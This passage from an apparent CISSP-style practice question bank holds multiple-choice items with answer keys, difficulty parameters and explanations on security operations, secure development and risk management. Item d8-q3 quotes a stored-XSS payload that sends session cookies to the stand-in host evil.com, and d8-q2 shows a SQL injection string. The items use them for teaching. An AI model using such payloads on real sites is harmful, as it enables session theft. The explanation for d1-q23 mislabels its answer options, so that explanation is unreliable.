      "discrimination": 1.1,
      "explanation": "Correct Answer: The backup strategy fails to meet the RPO — the data loss exceeds what the business can tolerate. RPO defines the maximum acceptable data loss measured in time. With an RPO of 1 hour, the organization can tolerate losing at most 1 hour of transactions. A 6-hour-old backup means 6 hours of data loss — six times the acceptable threshold. The RPO is about data age/loss tolerance, not recovery time. RTO governs how quickly recovery must complete, not data loss."
    },
    {
      "id": "d7-q12",
      "domain": "7 Security Operations",
      "stem": "A forensic investigator uses a hardware write blocker before imaging a suspect drive. What is the PRIMARY reason for using this device?",
      "choices": [
        "To speed up the imaging process by optimizing read throughput",
        "To verify that the drive is not physically damaged before imaging",
        "To decrypt encrypted partitions on the suspect drive",
        "To prevent any write operations to the evidence drive, preserving its original state"
      ],
      "correctIndex": 3,
      "difficulty": -0.3,
      "discrimination": 1.0,
      "explanation": "Correct Answer: To prevent any write operations to the evidence drive, preserving its original state. A write blocker intercepts all write commands to the target drive, ensuring the forensic process cannot modify evidence. This is fundamental to evidence integrity and chain of custody. Write blockers do not improve read speed, decrypt partitions, or perform drive health checks."
    },
    {
      "id": "d7-q13",
      "domain": "7 Security Operations",
      "stem": "A SOC team implements SOAR (Security Orchestration, Automation, and Response) to handle phishing email triage. When a phishing report is submitted, the system automatically extracts URLs, checks them against threat intelligence feeds, quarantines confirmed malicious emails, and creates an incident ticket. What is the PRIMARY benefit of this automation?",
      "choices": [
        "Reduced mean time to respond (MTTR) and consistent handling at scale",
        "Guaranteed prevention of all phishing attacks reaching users",
        "Replacement of the SIEM for log correlation and alerting",
        "Elimination of analyst involvement in all phishing investigations"
      ],
      "correctIndex": 0,
      "difficulty": 0.6,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Reduced mean time to respond (MTTR) and consistent handling at scale. SOAR automates repetitive, well-defined tasks (URL enrichment, quarantine, ticket creation), drastically reducing response time and ensuring consistent handling across high alert volumes. Analysts remain essential for complex investigations requiring judgment. SOAR complements SIEM but doesn't replace it. Automation handles known patterns but cannot prevent all novel phishing techniques."
    },
    {
      "id": "d7-q14",
      "domain": "7 Security Operations",
      "stem": "A threat intelligence analyst receives a report of a new APT group targeting healthcare organizations using a specific PowerShell-based dropper. To operationalize this intelligence, what is the MOST useful artifact to share with the SOC immediately?",
      "choices": [
        "A written narrative summary of the APT group's history and geopolitical motivations",
        "YARA rules and SIEM detection logic for the PowerShell dropper's behavioral indicators",
        "IP addresses observed in past campaigns over the previous 18 months",
        "A risk assessment report quantifying likelihood of targeting this organization"
      ],
      "correctIndex": 1,
      "difficulty": 0.7,
      "discrimination": 1.2,
      "explanation": "Correct Answer: YARA rules and SIEM detection logic for the PowerShell dropper's behavioral indicators. Operational threat intelligence is immediately actionable — YARA rules and SIEM logic enable the SOC to detect the specific threat in their environment right now. A narrative report is strategic intelligence useful for executives, not SOC triage. Historical IP addresses are often stale and unreliable for detection. A risk assessment describes likelihood but doesn't enable detection or response."
    },
    {
      "id": "d7-q15",
      "domain": "7 Security Operations",
      "stem": "A financial organization's DLP system alerts that a data scientist is uploading large CSV files to a personal cloud storage account during business hours. Upon investigation, the analyst finds the files contain anonymized test data with no PII. What is the MOST appropriate next step?",
      "choices": [
        "Dismiss the alert as a false positive since no PII was involved",
        "Immediately terminate network access and initiate HR proceedings",
        "Document the finding, interview the employee, and determine whether policy covers anonymized data uploads to personal storage",
        "Block all cloud storage access organization-wide to prevent recurrence"
      ],
      "correctIndex": 2,
      "difficulty": 0.6,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Document the finding, interview the employee, and determine whether policy covers anonymized data uploads to personal storage. Even without PII, uploading company data to personal storage may violate acceptable use or data handling policies. The appropriate response is to investigate the context, verify anonymization claims, and apply the policy correctly. Immediate termination is premature without investigation. Dismissing it entirely ignores potential policy violations. Blocking all cloud storage is a disproportionate response to a single ambiguous event."
    },
    {
      "id": "d7-q16",
      "domain": "7 Security Operations",
      "stem": "A SOC analyst detects a zero-day exploit being used against a critical application server. There is no vendor patch available. What is the BEST immediate response strategy?",
      "choices": [
        "Isolate the affected system, implement emergency compensating controls, and engage the vendor and threat intelligence community",
        "Wait for the vendor to release a patch before taking any action",
        "Restore the server from backup and return it to production",
        "Block the specific source IP of the attacker to stop the attack"
      ],
      "correctIndex": 0,
      "difficulty": 1.4,
      "discrimination": 1.3,
      "explanation": "Correct Answer: Isolate the affected system, implement emergency compensating controls, and engage the vendor and threat intelligence community. For a zero-day with no patch, the response is: isolate to contain, implement compensating controls (WAF rules, network restrictions, monitoring), notify the vendor, and leverage threat intel. Waiting for a patch leaves the vulnerability actively exploited. Restoring from backup reintroduces the vulnerability unless compensating controls are also applied. Blocking one IP doesn't stop the attack if the zero-day is publicly known — other attackers will attempt it."
    },
    {
      "id": "d8-q1",
      "domain": "8 Software Development Security",
      "stem": "A software development team wants to integrate security into every phase of the development lifecycle rather than testing at the end. Which approach BEST describes this security integration model?",
      "choices": [
        "Penetration testing at the end of each release cycle",
        "Waterfall development with a security phase before release",
        "DevSecOps — embedding security practices and tooling throughout the CI/CD pipeline",
        "Security code review performed only by a dedicated security team"
      ],
      "correctIndex": 2,
      "difficulty": -0.3,
      "discrimination": 1.0,
      "explanation": "Correct Answer: DevSecOps — embedding security practices and tooling throughout the CI/CD pipeline. DevSecOps integrates security at every stage — design, coding, build, test, deploy, and operations — through automated security gates, SAST/DAST tools, and security-aware development culture. Waterfall with a security phase at the end is the anti-pattern DevSecOps replaces. End-of-cycle pen testing alone is too late and too infrequent. Centralizing review in a security team creates bottlenecks and doesn't scale."
    },
    {
      "id": "d8-q2",
      "domain": "8 Software Development Security",
      "stem": "A web application accepts a user-supplied customer ID in an SQL query without sanitization: SELECT * FROM orders WHERE customer_id = '[user_input]'. An attacker enters: 1 OR 1=1 --. Which vulnerability is being exploited?",
      "choices": [
        "XML external entity (XXE) injection",
        "Command injection",
        "Cross-site scripting (XSS)",
        "SQL injection"
      ],
      "correctIndex": 3,
      "difficulty": -0.8,
      "discrimination": 0.95,
      "explanation": "Correct Answer: SQL injection. The attacker is inserting SQL syntax (OR 1=1 --) directly into the query, causing the database to return all records. This is a classic SQL injection attack. XSS injects malicious scripts into web pages viewed by other users. Command injection manipulates OS commands. XXE exploits XML parsers that process external entity references."
    },
    {
      "id": "d8-q3",
      "domain": "8 Software Development Security",
      "stem": "A malicious comment is submitted to a blog platform: <script>document.cookie='stolen='+document.cookie; fetch('https://evil.com?c='+document.cookie)</script>. When other users view the page, their session cookies are sent to the attacker. What attack is this?",
      "choices": [
        "DOM-based XSS",
        "Cross-Site Request Forgery (CSRF)",
        "Stored Cross-Site Scripting (Stored XSS)",
        "Reflected Cross-Site Scripting (Reflected XSS)"
      ],
      "correctIndex": 2,
      "difficulty": -0.4,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Stored Cross-Site Scripting (Stored XSS). The malicious script is persisted in the database (stored in the comment) and executes in every visitor's browser when they view the page — this is Stored (Persistent) XSS. Reflected XSS is not stored; it requires the victim to click a crafted link. DOM-based XSS manipulates the DOM environment without necessarily involving server-side storage. CSRF forces authenticated actions on behalf of a victim but doesn't inject scripts."
    },
    {
      "id": "d8-q4",
      "domain": "8 Software Development Security",
      "stem": "A security architect reviews a new application design. The application validates all inputs on the client-side JavaScript only, with no server-side validation. What is the PRIMARY security risk?",
      "choices": [
        "Client-side validation can be bypassed by an attacker intercepting and modifying requests before they reach the server",
        "Client-side validation is incompatible with RESTful API architectures",
        "JavaScript validation causes performance issues on low-end client devices",
        "The application will fail PCI DSS compliance due to insufficient logging"
      ],
      "correctIndex": 0,
      "difficulty": 0.1,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Client-side validation can be bypassed by an attacker intercepting and modifying requests before they reach the server. Client-side validation is a UX convenience only — attackers can use proxy tools (Burp Suite) to intercept requests and send arbitrary input directly to the server, bypassing all browser-based checks. Server-side validation is mandatory for security. Performance and API architecture compatibility are not security issues here. Logging failures are a separate concern."
    },
    {
      "id": "d8-q5",
      "domain": "8 Software Development Security",
      "stem": "A development team adopts a CI/CD pipeline with automated security gates. SAST runs on every pull request, DAST runs nightly, and dependency scanning runs on every build. A critical finding from SAST blocks a merge. Who has the authority to override a security gate finding?",
      "choices": [
        "The developer who submitted the pull request",
        "No one — critical security gate findings can never be overridden",
        "The DevOps engineer who manages the pipeline",
        "A defined risk acceptance process with sign-off from an authorized security or risk owner"
      ],
      "correctIndex": 3,
      "difficulty": 0.6,
      "discrimination": 1.15,
      "explanation": "Correct Answer: A defined risk acceptance process with sign-off from an authorized security or risk owner. Security gates should have a formal exception/waiver process where findings can be overridden through documented risk acceptance by an appropriately authorized individual. This maintains security governance while enabling business agility. Developers and DevOps engineers lack the authority to accept security risk unilaterally. Absolute blocks with no exception path make pipelines operationally unworkable."
    },
    {
      "id": "d8-q6",
      "domain": "8 Software Development Security",
      "stem": "A containerized application's base container image is built from an unverified image pulled from a public registry. Six months later, the image is found to contain a cryptocurrency miner. What supply chain security control would have MOST directly prevented this?",
      "choices": [
        "Using only signed, verified base images from a trusted internal registry with provenance checks",
        "Implementing network policies to prevent outbound connections from containers",
        "Scanning the container at runtime using a cloud workload protection platform",
        "Running containers as non-root users to limit privilege escalation"
      ],
      "correctIndex": 0,
      "difficulty": 0.8,
      "discrimination": 1.2,
      "explanation": "Correct Answer: Using only signed, verified base images from a trusted internal registry with provenance checks. The attack vector was an unverified base image from a public registry. Using cryptographically signed images from an internal, curated registry with image provenance verification directly prevents untrusted image use. Runtime scanning detects but does not prevent the introduction. Network policies limit miner communication but don't address the initial compromise. Non-root execution limits privilege but doesn't prevent the miner from running."
    },
    {
      "id": "d8-q7",
      "domain": "8 Software Development Security",
      "stem": "An API endpoint accepts a JSON request and uses the user-supplied 'role' field to set authorization levels: {\"username\": \"alice\", \"role\": \"admin\"}. What vulnerability does this represent?",
      "choices": [
        "Broken Object Level Authorization (BOLA) / Mass Assignment vulnerability allowing privilege escalation",
        "SQL injection through the JSON body",
        "Insecure direct object reference (IDOR) on the username field",
        "Cross-site request forgery via the JSON content type"
      ],
      "correctIndex": 0,
      "difficulty": 0.9,
      "discrimination": 1.2,
      "explanation": "Correct Answer: Broken Object Level Authorization (BOLA) / Mass Assignment vulnerability allowing privilege escalation. Accepting user-controlled properties like 'role' and applying them to authorization decisions is a mass assignment vulnerability (OWASP API Security #3 / #1). An attacker sets their own role to 'admin' to escalate privileges. This is distinct from IDOR (which involves accessing other users' objects) and SQL injection (which involves database query manipulation). JSON content type does not make a CSRF attack — CSRF exploits state-changing requests using authenticated sessions."
    },
    {
      "id": "d8-q8",
      "domain": "8 Software Development Security",
      "stem": "A government agency mandates that all software procured from vendors include a complete inventory of all open-source and third-party components and their known vulnerabilities. This requirement describes what artifact?",
      "choices": [
        "Software Bill of Materials (SBOM)",
        "System Security Plan (SSP)",
        "Common Vulnerabilities and Exposures (CVE) list",
        "Software Composition Analysis (SCA) report"
      ],
      "correctIndex": 0,
      "difficulty": 1.0,
      "discrimination": 1.2,
      "explanation": "Correct Answer: Software Bill of Materials (SBOM). An SBOM is a formal, machine-readable inventory of all software components, dependencies, and their relationships — mandated by Executive Order 14028 for software sold to the U.S. government. An SCA report is the tool output that helps generate an SBOM but is not the artifact itself. The CVE list is a vulnerability database, not a product-specific inventory. An SSP describes security controls for a system, not its software components."
    },
    {
      "id": "d8-q9",
      "domain": "8 Software Development Security",
      "stem": "A development team runs a Software Composition Analysis (SCA) tool and discovers a critical CVE in an open-source JSON parsing library used across 40 microservices. The vulnerability allows remote code execution. What is the MOST appropriate immediate action?",
      "choices": [
        "Remove the JSON parsing functionality from all services",
        "Update the vulnerable library to the patched version across all affected services and re-deploy",
        "Add a WAF rule to block requests that trigger the CVE",
        "Accept the risk until the next scheduled maintenance window"
      ],
      "correctIndex": 1,
      "difficulty": 0.7,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Update the vulnerable library to the patched version across all affected services and re-deploy. Remote code execution in a widely deployed component requires urgent patching. Modern CI/CD pipelines enable rapid library updates and re-deployment across microservices. Removing functionality impacts business capability unnecessarily. A WAF rule may partially mitigate but doesn't address the underlying vulnerability. Deferring a critical RCE to the next maintenance cycle is unacceptable."
    },
    {
      "id": "d8-q10",
      "domain": "8 Software Development Security",
      "stem": "A developer accidentally commits a cloud service API key and secret to a public source code repository. The key is detected by an automated scanner 4 minutes after the commit. What should happen IMMEDIATELY?",
      "choices": [
        "Notify management and wait for their direction before taking action",
        "Delete the commit from the repository history and consider the issue resolved",
        "Change the cloud account password to prevent access",
        "Revoke and rotate the exposed credentials immediately, then audit the cloud provider's access logs for unauthorized use"
      ],
      "correctIndex": 3,
      "difficulty": 0.5,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Revoke and rotate the exposed credentials immediately, then audit the cloud provider's access logs for unauthorized use. Exposed credentials must be treated as compromised immediately — revoke/rotate first to stop ongoing access, then investigate logs to determine if unauthorized use occurred. Deleting the commit doesn't help — repository history may be cached and the credential may already be harvested by scanners. Cloud account passwords are separate from API key authentication. Waiting for management direction delays critical remediation."
    },
    {
      "id": "d8-q11",
      "domain": "8 Software Development Security",
      "stem": "An organization deploys RASP (Runtime Application Self-Protection) in their production application. During normal operation, RASP detects and blocks a SQL injection attempt in real time without requiring a WAF rule update. What makes RASP different from a WAF in this scenario?",
      "choices": [
        "RASP operates from inside the application runtime and has full context of application state, making it more precise than external WAF rules",
        "RASP can only block attacks that have known signatures",
        "RASP replaces the need for secure coding practices in the application",
        "RASP requires no configuration while WAF requires extensive rule tuning"
      ],
      "correctIndex": 0,
      "difficulty": 1.0,
      "discrimination": 1.2,
      "explanation": "Correct Answer: RASP operates from inside the application runtime and has full context of application state, making it more precise than external WAF rules. RASP instruments the application itself and intercepts calls from within the execution environment — it can distinguish legitimate from malicious database queries with full context of application logic. A WAF operates externally and applies pattern-based rules without understanding application context. Both tools require configuration. RASP complements secure coding but doesn't replace it. RASP can detect behavioral anomalies beyond known signatures."
    },
    {
      "id": "d8-q12",
      "domain": "8 Software Development Security",
      "stem": "During threat modeling of a new payment processing service, the team identifies that sensitive cardholder data flows through an internal message queue shared with other applications. What secure design principle should be applied to this architecture?",
      "choices": [
        "Data isolation — cardholder data should flow through a dedicated, isolated queue with restricted access",
        "Defense in depth — multiple controls should protect the queue",
        "Encryption in transit — TLS should be applied to the message queue connection",
        "Least privilege — the queue service account should have minimal permissions"
      ],
      "correctIndex": 0,
      "difficulty": 0.7,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Data isolation — cardholder data should flow through a dedicated, isolated queue with restricted access. Sharing a message queue containing cardholder data with other applications violates PCI DSS scope containment and introduces unnecessary exposure. Data isolation limits the attack surface and reduces compliance scope. TLS in transit, least privilege, and defense in depth are all necessary but secondary to the architectural decision to isolate the data flow."
    },
    {
      "id": "d8-q13",
      "domain": "8 Software Development Security",
      "stem": "A software architect applies the principle of 'fail securely' to an access control module. Which behavior BEST demonstrates this principle?",
      "choices": [
        "If a session expires, the user is prompted to re-enter their username before the password field appears",
        "If the database is unreachable, the application displays a detailed error message to help users troubleshoot",
        "If the authorization service is unavailable, the application defaults to denying all access rather than allowing it",
        "If authentication fails, the application logs the error and retries automatically"
      ],
      "correctIndex": 2,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: If the authorization service is unavailable, the application defaults to denying all access rather than allowing it. Fail-secure (fail-closed) means that when a security mechanism fails, the system defaults to the more restrictive, secure state — deny access. This is contrasted with fail-open, where failures grant access. Automatic retry is a resilience behavior, not fail-secure. Detailed error messages can expose information (violating fail-secure). The re-authentication flow doesn't address failure states."
    },
    {
      "id": "d1-q21",
      "domain": "1 Security and Risk Management",
      "stem": "An information security officer at a financial services firm is directed by the CISO to sign off on a vendor contract that waives the firm's right to audit the vendor's security controls. The officer believes the waiver creates unacceptable residual risk. According to the ISC2 Code of Ethics, what should the officer do FIRST?",
      "choices": [
        "Sign the contract because the CISO has final authority over security decisions",
        "Alert regulators immediately because public safety may be at risk",
        "Raise the concern with the CISO and document her objection through proper channels before any escalation",
        "Refuse to sign and immediately report the CISO to the board of directors"
      ],
      "correctIndex": 2,
      "difficulty": 0.6,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Raise the concern and document the objection. The ISC2 Code of Ethics requires acting honorably and protecting principals (employer) while protecting society. The first step is raising the concern through proper internal channels — not immediate external escalation. Reporting to the board skips the chain and is premature. Signing despite objection violates the obligation to protect principals from harm. Regulatory reporting is appropriate only when internal escalation fails and public safety is truly at stake."
    },
    {
      "id": "d1-q22",
      "domain": "1 Security and Risk Management",
      "stem": "A security architect is building a threat model for a new payment platform. Her team debates whether to use attack trees or STRIDE. The platform has complex multi-party data flows and the team needs to systematically identify where privilege escalation and spoofing could occur across each component. Which approach is MOST appropriate?",
      "choices": [
        "STRIDE, because it systematically maps six threat categories to each component and data flow",
        "Neither — use a checklist derived from past incident reports instead",
        "STRIDE for data flows and attack trees only for authentication components",
        "Attack trees, because they model attacker goals and are better for compliance reporting"
      ],
      "correctIndex": 0,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: STRIDE. For systematically identifying threats across components and data flows — especially spoofing and privilege escalation — STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) is purpose-built for this decomposition. Attack trees model attacker goals but don't systematically map to components the way STRIDE does with DFDs. Checklists miss novel threats. The hybrid suggestion is arbitrary and unsupported."
    },
    {
      "id": "d1-q23",
      "domain": "1 Security and Risk Management",
      "stem": "A risk manager is calculating ALE for a server room flooding risk. He determines the asset value is $500,000, the exposure factor is 40%, and flooding occurs on average once every five years. What is the ALE?",
      "choices": [
        "$500,000 multiplied by 0.2 ARO equals $100,000",
        "$200,000 SLE multiplied by 5 ARO equals $1,000,000",
        "$500,000 multiplied by 40% equals $200,000 with no ARO adjustment",
        "$200,000 SLE multiplied by 0.2 ARO equals $40,000"
      ],
      "correctIndex": 3,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: ALE = SLE × ARO. SLE = Asset Value × EF = $500,000 × 0.40 = $200,000. ARO = 1/5 years = 0.2. ALE = $200,000 × 0.2 = $40,000. Option B forgets the EF step and applies ARO to full asset value. Option C inverts the ARO (uses 5 instead of 0.2). Option D calculates SLE only and skips ARO entirely."
    },
    {
      "id": "d1-q24",
      "domain": "1 Security and Risk Management",
      "stem": "A TOCTOU (time-of-check to time-of-use) vulnerability is discovered in an internal workflow system. The system checks a user's authorization at login but doesn't re-verify permissions before each sensitive transaction. What control BEST addresses this class of vulnerability?",
      "choices": [
        "Increase login session timeout to reduce the frequency of re-authentication",
        "Add logging for all transactions so that unauthorized actions can be detected post-hoc",
        "Enforce authorization checks immediately before each privileged operation, not only at session start",
        "Require two-person integrity for all system access"
      ],
      "correctIndex": 2,
      "difficulty": 0.5,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Enforce authorization at the point of use, not just at check time. TOCTOU vulnerabilities arise when the state can change between a check and the subsequent action. Re-verifying permissions immediately before each privileged operation closes this gap. Longer timeouts worsen exposure. Logging detects but does not prevent TOCTOU exploitation. Two-person integrity addresses collusion, not race-condition authorization gaps."
    },
    {
      "id": "d1-q25",
      "domain": "1 Security and Risk Management",
      "stem": "An organization completed a BIA and identified its customer billing system as having an MTD of 4 hours. During DR planning, the team proposes a recovery solution with an RTO of 6 hours. What action is REQUIRED before this solution can be accepted?",
      "choices": [
        "Accept the solution because RTO and MTD measure different things",
        "Replace the billing system with one that has a lower asset value",
        "Reduce the MTD to match the proposed RTO",
        "Revise the solution to bring RTO below the 4-hour MTD, or formally accept the gap with executive sign-off"
      ],
      "correctIndex": 3,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: The RTO must not exceed the MTD; when it does, either the solution must be improved or the risk formally accepted at the executive level. MTD (Maximum Tolerable Downtime) is the business tolerance ceiling — RTO must fit inside it. Claiming they measure different things is incorrect; RTO must always be less than MTD. You cannot lower MTD arbitrarily — it's set by business impact. Replacing the system is disproportionate and doesn't address the recovery time issue."
    },
    {
      "id": "d1-q26",
      "domain": "1 Security and Risk Management",
      "stem": "A newly hired analyst finds that the organization's security policy prohibits storing PII on laptops, but no technical controls enforce it. Employees routinely copy customer data to local drives. Which statement BEST describes this situation?",
      "choices": [
        "The employees are in violation of the AUP and should be terminated",
        "The policy is sufficient because it establishes accountability; enforcement is a management problem",
        "The organization has a policy gap — it lacks the procedural and technical controls to operationalize the stated policy",
        "The policy should be rewritten to permit laptop storage since employees require it"
      ],
      "correctIndex": 2,
      "difficulty": -0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: A policy without supporting procedures and technical controls is unenforceable — this is a classic implementation gap. Policies establish intent; standards, procedures, and controls enforce it. Saying enforcement is purely a 'management problem' ignores the security architecture responsibility. Terminating employees doesn't fix the systemic gap. Rewriting the policy to accommodate insecure behavior sacrifices data protection for convenience."
    },
    {
      "id": "d1-q27",
      "domain": "1 Security and Risk Management",
      "stem": "A security manager at a hospital discovers a nurse has been accessing patient records for individuals not under her care for three months. HIPAA requires notification. Legal counsel advises delaying disclosure to assess litigation exposure. What is the MOST appropriate action?",
      "choices": [
        "Delay notification until legal counsel completes its assessment to protect the organization",
        "Immediately terminate the nurse and treat the matter as resolved",
        "Notify only the affected patients and not HHS, because internal handling is sufficient",
        "Follow the mandatory HIPAA breach notification timeline regardless of litigation concerns, while coordinating with legal on disclosure content"
      ],
      "correctIndex": 3,
      "difficulty": 0.7,
      "discrimination": 1.2,
      "explanation": "Correct Answer: Comply with HIPAA notification requirements. The ISC2 Code of Ethics prioritizes societal and public safety obligations over organizational interests. HIPAA mandates breach notification to affected individuals and HHS within defined timeframes; litigation concerns don't suspend these obligations. Delaying notification is a HIPAA violation. Notifying patients but not HHS is incomplete compliance. Terminating the nurse doesn't satisfy breach notification obligations."
    },
    {
      "id": "d1-q28",
      "domain": "1 Security and Risk Management",
      "stem": "An organization's risk register shows a residual risk of $120,000 annually for a web application vulnerability after applying current controls. Management wants to reduce this further. A vendor offers a WAF subscription for $30,000/year that would cut residual risk to $40,000. What should the security team recommend?",
      "choices": [
        "Implement the WAF — the $30,000 cost produces $80,000 in annual risk reduction, a positive ROI",
        "Reject the WAF — residual risk will always remain and the cost cannot be justified",
        "Transfer the remaining $40,000 residual risk via cyber insurance instead of implementing the WAF",
        "Accept the current residual risk — any additional spend requires board approval"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Implement the WAF. Cost-benefit analysis: $30,000 spend reduces risk by $80,000 — a net benefit of $50,000. This is a straightforward positive ROI risk treatment decision. Claiming all residual risk is unavoidable ignores cost-effective mitigations. Board approval thresholds depend on organizational policy and this may not require it. Cyber insurance and the WAF aren't mutually exclusive, but the WAF is cost-justified on its own merits."
    },
    {
      "id": "d1-q29",
      "domain": "1 Security and Risk Management",
      "stem": "A financial services firm is subject to SOX, PCI DSS, and state privacy laws. The compliance team is building a unified control framework to avoid redundant audits. Which approach is MOST efficient?",
      "choices": [
        "Create separate control sets for each regulation and run independent audits annually",
        "Map all requirements to a common control framework (e.g., NIST CSF) and demonstrate how each control satisfies multiple regulatory obligations",
        "Outsource all compliance to a managed service provider and accept their attestation",
        "Focus exclusively on the most stringent regulation and assume other requirements are covered"
      ],
      "correctIndex": 1,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Map to a common framework and show how each control satisfies multiple requirements. This 'write once, satisfy many' approach (also called a unified compliance framework or UCF) reduces redundant controls and overlapping audit evidence. Separate control sets waste resources and miss synergies. Assuming the most stringent regulation covers everything is risky — gaps exist between frameworks. Outsourcing compliance doesn't eliminate the organization's own accountability."
    },
    {
      "id": "d1-q30",
      "domain": "1 Security and Risk Management",
      "stem": "The CISO of a mid-size logistics company is asked by the board to present the organization's current risk posture following a near-miss ransomware incident. The CISO has asset inventories, vulnerability scan results, and threat intelligence feeds but no formal risk register. What should the CISO present FIRST?",
      "choices": [
        "A threat intelligence summary, because knowing attacker TTPs is the most relevant board-level metric",
        "A list of security tool expenditures to demonstrate investment",
        "A structured risk register that aggregates assets, threats, vulnerabilities, likelihood, and impact into a prioritized list",
        "The raw vulnerability scan results, because they provide the most technical detail"
      ],
      "correctIndex": 2,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: A risk register. Boards need prioritized business risk context, not raw technical data. A risk register synthesizes assets, threats, vulnerabilities, likelihood, and impact into actionable priorities — exactly what board governance requires. Raw scan results are too technical for board consumption. Threat intelligence alone lacks business impact context. Tool expenditures without risk mapping demonstrate spending, not risk management."
    },
    {
      "id": "d1-q31",
      "domain": "1 Security and Risk Management",
      "stem": "An organization's mandatory vacation policy requires all employees in sensitive roles to take two consecutive weeks off annually. An auditor questions the effectiveness of the control because coverage arrangements are informal. What is the PRIMARY security purpose of mandatory vacation, and what gap does the auditor identify?",
      "choices": [
        "Mandatory vacation is purely a wellness benefit; the auditor is applying a security lens incorrectly",
        "Mandatory vacation detects fraud by requiring another person to perform the role; informal coverage means the detection mechanism isn't being exercised",
        "Mandatory vacation enforces separation of duties by splitting tasks between two roles permanently",
        "Mandatory vacation reduces burnout-related errors; the coverage gap is an HR problem, not a security issue"
      ],
      "correctIndex": 1,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Mandatory vacation is a fraud detection control — when another employee covers, ongoing fraud schemes are often exposed. If coverage is informal or the same person effectively continues work remotely, the control is circumvented. The auditor correctly identifies that the detection mechanism isn't functioning. It is not merely a wellness benefit. It doesn't create permanent role splits like separation of duties. Burnout reduction is a side benefit, not the primary security purpose."
    },
    {
      "id": "d1-q32",
      "domain": "1 Security and Risk Management",
      "stem": "During NIST RMF Step 3 (Implement), a system owner skips configuring several controls listed in the SSP because the implementation is technically complex. The SSP is then submitted for Step 4 (Assess). What is the MOST significant risk created?",
      "choices": [
        "The missing controls will be identified in Step 5 (Authorize) and retroactively approved",
        "NIST RMF is flexible enough that unimplemented controls are acceptable if compensating controls exist",
        "The assessor will evaluate the system against controls the SSP claims are implemented, creating an authorization decision based on false premises",
        "The system will fail Step 4 automatically because all controls must be implemented before assessment begins"
      ],
      "correctIndex": 2,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: The assessor tests against the SSP's stated controls — if controls are listed as implemented but aren't, the assessment generates findings against a false baseline, and any resulting ATO (Authority to Operate) reflects a risk posture that doesn't actually exist. Step 4 doesn't 'automatically fail' — assessors test what's described. Step 5 authorizes based on assessment results, not a separate control review. Compensating controls are valid but must be formally documented and approved, not silently substituted."
    },
    {
      "id": "d1-q33",
      "domain": "1 Security and Risk Management",
      "stem": "A security consultant is conducting due diligence before an acquisition target — a SaaS company. The consultant reviews the target's SOC 2 Type II report, interviews IT staff, and examines network diagrams. The target refuses to allow penetration testing during due diligence. What is the MOST appropriate next step?",
      "choices": [
        "Cancel the acquisition because the refusal is a definitive sign of concealed vulnerabilities",
        "Include the penetration testing restriction as a material risk finding and recommend that testing rights be written into the acquisition agreement",
        "Conduct passive reconnaissance of the target's public infrastructure to substitute for the denied testing",
        "Accept the refusal — SOC 2 Type II is sufficient evidence of security posture"
      ],
      "correctIndex": 1,
      "difficulty": 0.6,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Document the restriction as a material risk and negotiate testing rights into the acquisition terms. Companies routinely restrict testing during due diligence for liability and operational reasons — it doesn't automatically indicate concealed problems. SOC 2 Type II covers audit period controls but doesn't replace penetration testing. Canceling acquisition is disproportionate without additional evidence. Conducting unauthorized reconnaissance without permission is unethical and potentially illegal."
    },
    {
      "id": "d1-q34",
      "domain": "1 Security and Risk Management",
      "stem": "An organization operates in a jurisdiction that requires a 72-hour breach notification window. Following a ransomware incident, the IR team spends 60 hours on forensic investigation before notifying the legal team, who then need time to draft notifications. What control failure does this scenario MOST illustrate?",
      "choices": [
        "Failure to encrypt backups, which caused the ransomware to succeed",
        "An inadequate tabletop exercise program that left the team unprepared",
        "Lack of a documented incident response escalation path that triggers legal and compliance notification in parallel with technical investigation",
        "Insufficient forensic tools to complete investigation faster"
      ],
      "correctIndex": 2,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: The escalation path should trigger legal and compliance notification in parallel — not after — technical investigation. Regulatory notification clocks start at discovery, not at the completion of forensics. The failure is process, not tool capability. Backup encryption is relevant to recovery, not notification timeline compliance. Tabletop exercises may have helped, but the specific gap here is the sequential (not parallel) escalation process."
    },
    {
      "id": "d1-q35",
      "domain": "1 Security and Risk Management",
      "stem": "A risk manager at a technology company uses a 5×5 risk matrix with likelihood and impact rated 1-5. Two risks score 12: Risk A (likelihood 4, impact 3) and Risk B (likelihood 3, impact 4). A senior executive wants to treat them identically. What is the MOST accurate assessment?",
      "choices": [
        "They should be treated differently — high-likelihood risks favor preventive controls while high-impact risks favor transfer or contingency planning",
        "Both risks should be accepted because a score of 12 is below the treatment threshold of 15",
        "Identical scores mean identical treatment; the matrix captures all necessary information",
        "Risk B should always be prioritized over Risk A regardless of score because impact drives regulatory exposure"
      ],
      "correctIndex": 0,
      "difficulty": 0.7,
      "discrimination": 1.2,
      "explanation": "Correct Answer: Identical scores can reflect different risk profiles requiring different treatment strategies. High-likelihood/lower-impact risks (Risk A) are frequent and suit preventive or detective controls. High-impact/lower-likelihood risks (Risk B) suit transfer mechanisms (insurance) or contingency planning. A 5×5 matrix loses nuance; the components must be examined separately. Accepting both at score 12 is an arbitrary threshold decision that ignores treatment-type appropriateness."
    },
    {
      "id": "d1-q36",
      "domain": "1 Security and Risk Management",
